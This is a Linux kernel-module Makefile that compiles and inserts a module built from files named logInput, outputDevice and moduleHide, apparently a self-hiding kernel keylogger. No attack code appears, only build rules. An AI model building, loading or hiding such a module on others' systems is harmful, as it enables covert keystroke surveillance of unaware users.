MAKEDIR = $(shell pwd)
KMAKEDIR = /lib/modules/$(shell uname -r)/build
MODULE = main

obj-m += $(MODULE).o
main-y += logInput.o outputDevice.o moduleHide.o


all:
	make -C $(KMAKEDIR) M=$(MAKEDIR) modules
clean:
	make -C $(KMAKEDIR) M=$(MAKEDIR) clean

install: all
	insmod ./$(MODULE).ko
uninstall:
	rmmod $(MODULE)


# kbuild part of makefile
#obj-m  := main.o
#main-y := logInput.o outputDevice.o moduleHide.o


## normal makefile
#KDIR ?= /lib/modules/`uname -r`/build

#default:
#	$(MAKE) -C $(KDIR) M=$$PWD

# TODO: add clean

